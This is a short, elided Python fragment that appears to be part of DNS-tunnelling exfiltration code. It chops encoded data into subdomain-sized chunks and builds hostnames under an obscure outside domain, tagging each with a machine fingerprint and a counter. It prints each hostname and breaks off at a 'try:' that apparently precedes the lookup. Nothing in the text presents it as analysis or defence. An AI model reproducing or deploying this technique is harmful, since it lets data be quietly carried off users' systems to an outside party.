...
for i in range(0, math.ceil(len(encoded_data) / (4*MAX_SUBDOMAIN_LENGTH)), 1):
    ...
    url = "{}.{}.3bf2562afafaf.afalog.dnfafaslog.sbfafaffas".format(".".join(divide_chunks(encoded_data[i*4*MAX_SUBDOMAIN_LENGTH:(i+1)*4*MAX_SUBDOMAIN_LENGTH], MAX_SUBDOMAIN_LENGTH)), fingerprint[0:6] + str(i))
    print(url)
    try:
